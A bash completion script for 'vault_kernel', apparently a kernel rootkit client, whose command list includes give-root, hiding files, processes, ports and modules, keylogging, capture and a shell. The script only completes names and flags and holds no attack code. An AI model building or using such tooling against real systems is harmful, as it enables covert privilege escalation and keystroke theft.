# vault_kernel — bash completion (v3.10)
#
# Self-contained: it does NOT require the bash-completion package, only
# bash's builtin `complete`/`compgen`, so it works in minimal lab shells
# and containers. It covers BOTH clients — the Go binary (`vault_kernel`)
# and the Python CLI (`vault_kernel_cli.py`) — because they share the
# same command surface (parity is a project invariant, ADR 18/19).
#
# Install (manual):
#   source completions/vault_kernel.bash
# or system-wide:
#   sudo cp completions/vault_kernel.bash /etc/bash_completion.d/vault_kernel
#
# Flags per command mirror the CLIs' usage texts:
#   doctor/list/stats/status  --json
#   watch              --interval --once
#   keylog             --follow --timestamps --interval --output
#   capture            --out
#   hide-file/unhide-file fall back to file names (compgen -f).

_vault_kernel_completions() {
    local cur prev commands
    COMPREPLY=()
    cur="${COMP_WORDS[COMP_CWORD]}"
    prev="${COMP_WORDS[COMP_CWORD-1]}"
    commands="status doctor give-root hide-file unhide-file hide-pid unhide-pid hide-port unhide-port list stats watch shell magic magic-encode keylog keylog-clear capture hide-module unhide-module reset version help"

    case "$prev" in
        doctor|list|stats|status)
            mapfile -t COMPREPLY < <(compgen -W "--json" -- "$cur")
            return 0
            ;;
        watch)
            mapfile -t COMPREPLY < <(compgen -W "--interval --once" -- "$cur")
            return 0
            ;;
        keylog)
            mapfile -t COMPREPLY < <(compgen -W "--follow --timestamps --interval --output" -- "$cur")
            return 0
            ;;
        capture)
            mapfile -t COMPREPLY < <(compgen -W "--out" -- "$cur")
            return 0
            ;;
        hide-file|unhide-file)
            # The kernel hide-list matches base names; offer the filesystem.
            mapfile -t COMPREPLY < <(compgen -f -- "$cur")
            return 0
            ;;
        give-root|hide-pid|unhide-pid|hide-port|unhide-port|shell|magic|magic-encode|keylog-clear|reset|hide-module|unhide-module|version|help)
            # Positional/numeric operands: no flag completion.
            return 0
            ;;
    esac

    if [[ "$COMP_CWORD" -eq 1 ]]; then
        mapfile -t COMPREPLY < <(compgen -W "$commands" -- "$cur")
    fi
    return 0
}

complete -F _vault_kernel_completions vault_kernel
complete -F _vault_kernel_completions vault_kernel_cli.py
